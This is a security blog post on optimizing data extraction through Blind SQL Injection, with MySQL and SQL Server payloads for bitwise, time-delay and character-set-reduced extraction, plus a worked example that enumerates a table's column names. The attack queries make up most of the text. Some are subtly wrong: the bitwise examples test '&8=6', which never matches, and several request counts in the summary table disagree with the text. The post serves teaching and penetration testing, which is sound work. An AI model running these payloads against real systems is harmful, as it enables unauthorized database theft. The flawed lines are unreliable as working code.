---
layout: post
title: Blind SQL injection optimization
category: security
---

In this post I examine techniques and optimizations which can be used to efficiently extract SQL query results from Blind SQL Injection vulnerabilities. With the correct techniques and optimizations the majority of SQL query results can be extracted using at most two requests per character in the result string plus two requests for a length check. Under certain conditions results may be able to be extracted using significantly fewer requests.

This post draws together known Blind SQL Injection data extraction techniques and builds upon them in order to reduce the number of requests required to extract query results to the absolute minimum.

<!--more-->

Blind SQL Injection is a type of SQL Injection vulnerability whereby only a `true` or `false` result can be determined from the database +[OWASP Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection). If SQL Injection or Blind SQL Injection are not familiar to you I suggest starting with some introductory material (such as +[Everything you wanted to know about SQL injection by Troy Hunt](https://www.troyhunt.com/everything-you-wanted-to-know-about-sql/)) before continuing this post.

In the examples throughout this post I will present MySQL (MySQL and MariaDB) and SQL Server syntax. All techniques should work fine on other SQL database engines, however the syntax may need modifying slightly.

# Data extraction
When considering extracting data from Blind SQL injection vulnerabilities the cost of data extraction needs to be considered. Primarily the cost of extracting data is the number of requests required to perform the data extraction, a secondary cost (not necessarily related to the number of requests) is the amount of time data extraction will take. The techniques outlined below aim to increasingly reduce the number of requests required for data extraction.

## Naïve byte extraction
The simplest naïve data extraction technique is to extract the query result data byte by byte by testing each byte of the result against the full set of 256 possible values for that byte. As an example it could be implemented using the following SQL statements:
`MySQL`
```sql
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))=0 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))=1 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))=2 THEN 1 ELSE 0 END
...
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))=255 THEN 1 ELSE 0 END
```
`SQL Server`
```sql
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)=0 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)=1 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)=2 THEN 1 ELSE 0 END
...
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)=255 THEN 1 ELSE 0 END
```
Where `(xxx)` is the query we want to make.

The worst case for naïve byte extraction (with no optimizations) is 256 requests per byte, although in practice this would very rarely be the case. This is obviously terrible and no one would actually use this, but it is good to have a "worst case" starting point when considering improved techniques.

## Divide and conquer byte extraction
The divide and conquer algorithm +[Divide and conquer algorithm](https://en.wikipedia.org/wiki/Divide_and_conquer_algorithm) recursively splits a search space in two, checking which sub-set the result falls into until there is only one value remaining. It could be implemented using the following SQL statements:
`MySQL`
```sql
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<128 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<64 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<96 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<80 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<72 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<68 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<66 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))<67 THEN 1 ELSE 0 END
```
`SQL Server`
```sql
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<128 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<64 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<96 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<80 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<72 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<68 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<66 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)<67 THEN 1 ELSE 0 END
```
Where `(xxx)` is the query we want to make.

Each byte extracted using the divide and conquer requires 8 requests, this is already significant improvement over the naïve byte extraction method. However, requests cannot be parallelized per byte as each request (baring the first) depends on the result of the previous request so must be performed in serial.

## Bitwise byte extraction
To improve request parallelization we can use the bitwise byte extraction techniques. For this technique we simply test each bit of each byte we wish to extract, the result will either be a `1` or a `0` which map to our `true` or `false` query responses:
`MySQL`
```sql
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&1=1 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&2=2 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&4=4 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&8=6 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&16=16 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&32=32 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&64=64 THEN 1 ELSE 0 END
CASE WHEN ORD(SUBSTR(BINARY((xxx)), 1, 1))&128=128 THEN 1 ELSE 0 END
```
`SQL Server`
```sql
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&1=1 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&2=2 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&4=4 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&8=6 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&16=16 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&32=32 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&64=64 THEN 1 ELSE 0 END
CASE WHEN SUBSTRING(CONVERT(binary, (xxx)), 1, 1)&128=128 THEN 1 ELSE 0 END
```
Where `(xxx)` is the query we want to make.

We can then reconstruct the bits into the resulting byte. As with the divide and conquer technique bitwise byte extraction requires 8 requests per byte, however the requests can be parallelized, no single request depends on the result of a previous request.

## A note on result data length
One thing we have to consider when extracting result data is when to stop, there is no point attempting to extract 128 bytes of a 10 byte long query result. There are two obvious methods for doing this. The first is to extract the length of the result before we start to extract any data. This can be done using the `LENGTH` function for MySQL or the `LEN` function on SQL Server. We can then use divide and conquer or bitwise byte extraction to extract the length before starting to extract the query data. The second method is to keep extracting data until we hit a `null` byte (0x00). The MySQL `SUBSTR` function returns the empty string `''` if the `position` argument is outside the length of the `str` input string argument, similarly the SQL Server `SUBSTR` function will return `null` if the `start` argument is outside the length of the `expression` input string argument. We can use this `null` response as a flag to stop extracting data.

The `null` character length check scales better with longer result strings and can be optimized more heavily than extracting the length of the data up front. The one area `null` checks will fall down is if we are extracting data with `null` bytes in, e.g. binary data. For these cases upfront data length checking is required.

The number of requests required to perform a `null` character length check will be the same as the number of requests required to check a single character, with bitwise byte extraction this would be 8 requests. Upfront data length checking fewer or more requests depending on the length of the query result.

# Optimizations
## Character set optimizations
### ASCII character extraction
In the above examples we extract full bytes from the query result. This is fine if we are attempting to extract binary data from the database, but more often than not we will be extracting text data. If we expect the result to be represented by non-extended ASCII characters we can perform simple character extraction rather than byte extraction. ASCII represents the characters of the English alphabet, numbers, punctuation and control characters. Each ASCII character can be represented using 7 bits, which reduces the number of requests required per character to 7 compared to 8 for byte extraction.

`MySQL`
```sql
ASCII(SUBSTR((xxx), 1, 1))
```

`SQL Server`
```sql
ASCII(SUBSTRING((xxx), 1, 1))
```
Where `(xxx)` is the query we want to make.

Obviously if we need to consider extended character sets this optimization will not be applicable.

### Character set reduction
Building on the ASCII character extraction optimization, we can reduce the character set from ASCII to a smaller arbitrary character set, e.g.:
```
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_
```

We can the use the `INSTR` function for MySQL or `CHARINDEX` function for SQL Server to get the index into our defined character set of the result character we are extracting.

`MySQL`
```sql
INSTR(
  ' !"#$%&''()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_',
  SUBSTR((xxx), 1, 1)
) - 1
```

`SQL Server`
```sql
CHARINDEX(
  SUBSTRING((xxx), 1, 1),
  ' !"#$%&''()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_'
) - 1
```
Where `(xxx)` is the query we want to make and ` !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_` is the character set we wish to check against. Both `INSTR` and `CHARINDEX` index starting from 1, so we can remove 1 from the result to zeroth index the result.

It should be noted that both `INSTR` on MySQL and `CHARINDEX` on SQL Server are case insensitive checks so any results using the above queries will be converted to uppercase. For case-sensitive results collation can be used (see +[COLLATE Transact-SQL](https://msdn.microsoft.com/en-us/library/ms184391.aspx) and +[Collation Implementation Types](http://dev.mysql.com/doc/refman/8.0/en/charset-collation-implementations.html)).

This optimization has the added benefit of allowing us to define a character set including Unicode characters, such as the following character set for the German alphabet:
```
ABCDEFGHIJKLMNOPQRSTUVWXYZÄÖÜß
```

This optimization can be taken to the extreme if the exact character set of the target data is known. For example password hashes may use only the following character set:
```
0123456789ABCDEF
```

The number of bits required to extract a result character from a defined character set is `ceil(log2(character set length))`, therefore a 64 character character set requires 6 bits to be extracted per character, a 32 character character set requires 5 bits per character and a 16 character character set requires only 4 bits per character. Obviously this optimization is only appropriate if a succinct character set can be defined for the result text.

### Character set confirmation
The character set of the query result will not always be known or guessable. Extracting query results against an inaccurate character set will accidentally exclude characters in the result text, providing a false result. Luckily we can easily check that the result text confirms to a given character set using 1 additional request:

`MySQL`
```sql
CASE WHEN (xxx) NOT REGEXP '[^0123456789ABCDEF]' THEN 1 ELSE 0 END
```

`SQL Server`
```sql
CASE WHEN (xxx) NOT LIKE'%[^0123456789ABCDEF]%' THEN 1 ELSE 0 END
```
Where `(xxx)` is the query we want to make and `0123456789ABCDEF` is the character set we wish to check against.

This can be extended to check a character set against all values in a query result set in a single request:
`MySQL`
```sql
CASE WHEN (
  SELECT SUM(sum_result) FROM (
    SELECT 1 as sum_result from (
      (xxx)
    ) AS x
    WHERE (yyy) REGEXP '[^0123456789ABCDEF]'
  ) AS y
) IS NULL THEN 1 ELSE 0 END
```

`SQL Server`
```sql
CASE WHEN (
  SELECT SUM(sum_result) FROM (
    SELECT 1 as sum_result FROM (
      (xxx)
    ) AS x
    WHERE (yyy) LIKE '%[^0123456789ABCDEF]%'
  ) AS y
) IS NULL THEN 1 ELSE 0 END
```
Where `(xxx)` is the query we want to make, `(yyy)` is the column name we are selecting and `0123456789ABCDEF` is the character set we wish to check against. Combining character set reduction and confirmation can efficiently define a reduced character set which significantly reduces the number of requests required to extract the result data.

## Multi bit requests
### Extracting 2 bits of information
Typically with blind SQL injection we extract one bit of information per request, namely true or false. Further bits of information can often be extracted by introducing response delays through SQL sleep functions.

Combining the two bits of information from boolean results and time delays we can receive four possible results for each request:
* False result with no delay (00)
* True result with no delay (01)
* False result with delay (10)
* True result with delay (11)

The MySQL `SLEEP` function and SQL Server `WAITFOR DELAY` statement can be used to introduce the required timed delays into the SQL query result:

`MySQL`
```sql
(
  CASE WHEN test&1=1 THEN 1 ELSE 0 END
) + (
  CASE WHEN test&2=2 THEN SLEEP(5) ELSE 0 END
) FROM (SELECT (zzz) AS test) as x
```

`SQL Server`
```sql
CASE WHEN (zzz)&1=1 THEN 1 ELSE 0 END;
IF((zzz)&2=2)
  WAITFOR DELAY '00:00:05'
ELSE
  SELECT 0;--
```

Where `(zzz)` is the bit result of the current slice of the query we want to make. Unfortunately the SQL Server `WAITFOR DELAY` statement is particularly sensitive to it's placement in a SQL query, not allowing it to be placed within subqueries. To get around this constraint we may be able to use stacked queries as show above. With stacked queries we must perform our query twice per request, once for the boolean return bit and once for the time delay bit. Stacked queries will not always be viable, so another option for introducing time delays is through the use of heavy queries +[Time-Based Blind SQL Injection using Heavy Queries](https://www.defcon.org/images/defcon-16/dc16-presentations/alonso-parada/defcon-16-alonso-parada-wp.pdf).

Using this method we can extract 2 bits of information per request.

### Extracting 3+ bits of information
As described in a post by Hack All The Things +[Extracting Multiple Bits Per Request From Full-blind SQL Injection Vulnerabilities](http://howto.hackallthethings.com/2016/07/extracting-multiple-bits-per-request.html), time-based techniques can be used to extract multiple bits in a single request. This method essentially chunks the result delay into time segments which can be decoded into bit values.

The number of bits which can be accurately extracted in a single request can be calculated by `max_bits = log2((max_timeout/max_rrt) + 1) - (log2((max_timeout/max_rrt) + 1) % 1)` where `max_timeout` is the largest delay the database server will allow a query to delay without throwing an error and `max_rrt` is the maximum Round Trip Time (RRT) we can expect from the target server under load. Some examples of the number of bits that can be extracted per request are:

Max Timeout | Max RRT | Max bits per request
------------|---------|---------------------
60          | 4       | 4
35          | 5       | 3
18          | 6       | 2

The time segments to bit mapping for a server with a max query timeout of 18 seconds and a max RRT of 4 seconds would be:
* 0 second delay (00)
* 6 second delay (01)
* 12 second delay (10)
* 18 second delay (11)

We can combine this with the boolean result to add an additional response bit:
* False result with 0 second delay (000)
* True result with 0 second delay (001)
* False result with 6 second delay (010)
* True result with 6 second delay (011)
* Etc.

`MySQL`
```sql
(
  CASE WHEN test&1=1 THEN 1 ELSE 0 END
), (
  CASE WHEN test&2=2 THEN SLEEP(6) ELSE 0 END
), (
  CASE WHEN test&4=4 THEN SLEEP(12) ELSE 0 END
) FROM (SELECT (zzz) AS test) as x
```

`SQL Server`
```sql
CASE WHEN (zzz)&1=1 THEN 1 ELSE 0 END;
IF((zzz)&2=2)
  WAITFOR DELAY '00:00:06'
ELSE
  SELECT 0;
IF((zzz)&4=4)
  WAITFOR DELAY '00:00:12'
ELSE
  SELECT 0;--
```
Where `(zzz)` is the bit result of the current slice of the query we want to make.

## Result guessing
In some circumstances the result of a query may be known to be in a tight set of pre known candidates, for example SQL data types (`CHAR`, `VARCHAR`, `BLOB`, etc.) in which case knowing only a partial result could allow us to guess the exact result. For example, given the input corpus:
* Alice
* Bob
* Charlie
* Doogle
* Emily

To determine the result is `Charlie` we need only determine the first character is a `C`, as `Charlie` is the only candidate starting with the character `C`.

If we have a tightly defined input corpus of all possible results, we can easily calculate the minimum number of requests to uniquely identify a candidate from the input corpus and perform only those requests. For example, given the input corpus above we only have to query the 3 least significant bits of the first character to determine the result:

`MySQL`
```sql
ORD(SUBSTR(BINARY('Alice'), 1, 1))&7   #0b001
ORD(SUBSTR(BINARY('Bob'), 1, 1))&7     #0b010
ORD(SUBSTR(BINARY('Charlie'), 1, 1))&7 #0b011
ORD(SUBSTR(BINARY('Doogle'), 1, 1))&7  #0b100
ORD(SUBSTR(BINARY('Emily'), 1, 1))&7   #0b101
```
`SQL Server`
```sql
SUBSTRING(CONVERT(binary, 'Alice'), 1, 1)&7   --0b001
SUBSTRING(CONVERT(binary, 'Bob'), 1, 1)&7     --0b010
SUBSTRING(CONVERT(binary, 'Charlie'), 1, 1)&7 --0b011
SUBSTRING(CONVERT(binary, 'Doogle'), 1, 1)&7  --0b100
SUBSTRING(CONVERT(binary, 'Emily'), 1, 1)&7   --0b101
```

If we have a loosely defined input corpus with only a subset of possible results we can still use this optimization. Any bit of information from the query result can be used to reduce the input corpus. Once we have only a small number of remaining candidates we can check the query result against these candidates in order to confirm the result. We can extend this to choose the order we request the bits of the result based on the number of candidates from the input corpus the requested bits will eliminate. Ideally each request should eliminate half, or as close as possible, of the input corpus, thus allowing a divide and conquer search through the corpus. Using this method to reduce an input corpus of 256 candidates would take approximately 8 requests.

We can take this one step further and learn about results from the target database itself. In certain datasets values are often repeated, for example in table column names. If we determine that one table has a column name of `Created` we can add that to our column name corpus. We can then use the updated column name corpus when querying the columns of another table.

In tests this method has been shown to significantly reduce the number of requests required to enumerate table structures.

## Confirming results

Building upon result guessing we can easily confirm our guesses against the database for accuracy, requiring only one additional request:
```sql
CASE WHEN (xxx)='Alice' THEN 1 ELSE 0 END
```
Where `(xxx)` is the result we want to confirm and `Alice` is the guess candidate.

Further to this can confirm or test multiple potential results in a single request; `(2^n) - 1` candidates per request where `n` is the number of bits we can extract from each request. For example, if we can extract 2 bits of information per request we can test 3 guesses, 3 bits means we can test 7 guesses:
`MySQL`
```sql
(INSTR('______Alice__Bob____Charlie', (xxx))/7)&255
```
`SQL Server`
```sql
(CHARINDEX((xxx), '______Alice__Bob____Charlie')/7)
```

Where `(xxx)` is the result we want to confirm and `Alice`, `Bob`, and `Charlie` are the guess candidates. We use the string index functions, `INSTR` for MySQL and `CHARINDEX` for SQL Server, to return the index into the candidate string of the result. The returned value divided by the length of the padded guess candidates, in the above case `7`, gives us the a result in the binary range `00` to `11`.  A result of `01` would be returned if `Alice` is the correct result, `10` for `Bob`, `11` for `Charlie` and `00` for none of the guesses being correct.

Combining result guessing and confirmation we can whittle down an input corpus based on retrieved bits of information, and when we have only a small number of candidates remaining perform a single request to check if any of the remaining candidates are correct. This allows us to efficiently check a result against a predefined or discovered input corpus.

# Summary
Combining the bitwise character extraction, character set reduction and temporal inference as described above we can often reliably extract query result text using at most 2 requests per character, 2 requests for the `null` character length check and two optional requests (character set confirmation and result confirmation).

To illustrate the efficiency of these optimizations consider the following table showing the number of requests required to extract the text response from a query result with length 16:

Technique                            | Result Requests | Additional Requests      | Total Requests
-------------------------------------|-----------------|--------------------------|---------------
**Data extraction techniques**       |                 |                          |
Naive byte extraction                | 4,096           | 256 (LC)                 | 4,352
Divide and conquer byte extraction   | 128             | 8 (LC)                   | 136
*Bitwise byte extraction*            | 128             | 8 (LC)                   | **136**
**Character set optimizations**      |                 |                          |
ASCII character extraction           | 112             | 7 (LC)                   | 119
*Character set reduction*            | 96              | 6 (LC) + 1 (CS)          | **103**
**Multi bit requests**               |                 |                          |
Extracting 2 bits of information     | 48              | 3 (LC) + 1 (CS) + 1 (RC) | 53
*Extracting 3+ bits of information*  | 32              | 2 (LC) + 1 (CS) + 1 (RC) | **36**

`LC`: Length Check request
`CS`: Character Set request
`RC`: Result Confirmation request

Even over reasonably efficient bitwise ASCII character extraction the outlined optimizations can save 83 requests on a 16 character query result. On top of this, if the result we are querying is in a known or discovered input corpus it can often be extracted using result guessing in fewer than 8 requests.

# Thanks
Thanks to Pentest Monkey for the excellent SQL injection cheat sheets +[SQL Injection Cheat Sheets by Pentest Monkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection).

Thanks to SQLZoo +[SQLZoo](http://sqlzoo.net/) for providing a sandbox in which these methods could be tested and refined.

# Worked Example

Worked example extracting 2 bits per request (result + temporal) with character set reduction to query all column names from a table called `games`:
```sql
-- The query we want to execute
SELECT
DISTINCT(column_name) FROM information_schema.columns
WHERE table_name='games';

-- Check character set is acceptable across all results
SELECT CASE WHEN (
  SELECT SUM(result) from (
    SELECT 1 as result from (
      SELECT
      DISTINCT(column_name) FROM information_schema.columns
      WHERE table_name='games'
    ) as x WHERE column_name REGEXP '[^ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]'
  ) as y
) IS NULL THEN 1 ELSE 0 END;

-- Extract bits 1 & 2 of the first character of the first result
SELECT (
  -- Extract 1st bit through true/false result
  CASE WHEN (
    SELECT INSTR(
      'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
      SUBSTR(
        (
          SELECT
          DISTINCT(column_name) FROM information_schema.columns
          WHERE table_name='games'
          LIMIT 1 OFFSET 0 -- First result
        ),
        1, -- First character
        1
      )
    )
  )&1=1 THEN 1 ELSE 0 END
) + (
  -- Extract 2nd bit through temporal result
  CASE WHEN (
    SELECT INSTR(
      'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
      SUBSTR(
        (
          SELECT
          DISTINCT(column_name) FROM information_schema.columns
          WHERE table_name='games'
          LIMIT 1 OFFSET 0 -- First result
        ),
        1, -- First character
        1
      )
    )
  )&2=2 THEN SLEEP(2) ELSE 0 END
);

-- Extract bits 3 & 4 of the first character of the first result
SELECT (
  -- Extract 3rd bit through true/false result
  CASE WHEN (
    SELECT INSTR(
      'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
      SUBSTR(
        (
          SELECT
          DISTINCT(column_name) FROM information_schema.columns
          WHERE table_name='games'
          LIMIT 1 OFFSET 0 -- First result
        ),
        1, -- First character
        1
      )
    )
  )&4=4 THEN 1 ELSE 0 END
) + (
  -- Extract 4th bit through temporal result
  CASE WHEN (
    SELECT INSTR(
      'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
      SUBSTR(
        (
          SELECT
          DISTINCT(column_name) FROM information_schema.columns
          WHERE table_name='games'
          LIMIT 1 OFFSET 0 -- First result
        ),
        1, -- First character
        1
      )
    )
  )&8=8 THEN SLEEP(2) ELSE 0 END
);

...

-- Extract bits 5 & 6 of the seventh character of the third result
SELECT (
  -- Extract 5th bit through true/false result
  CASE WHEN (
    SELECT INSTR(
      'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
      SUBSTR(
        (
          SELECT
          DISTINCT(column_name) FROM information_schema.columns
          WHERE table_name='games'
          LIMIT 1 OFFSET 2 -- Third result
        ),
        7, -- Seventh character
        1
      )
    )
  )&16=16 THEN 1 ELSE 0 END
) + (
  -- Extract 6th bit through temporal result
  CASE WHEN (
    SELECT INSTR(
      'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
      -- Select seventh character
      SUBSTR(
        (
          SELECT
          DISTINCT(column_name) FROM information_schema.columns
          WHERE table_name='games'
          LIMIT 1 OFFSET 2 -- Third result
        ),
        7, -- Seventh character
        1
      )
    )
  )&32=32 THEN SLEEP(2) ELSE 0 END
);
```
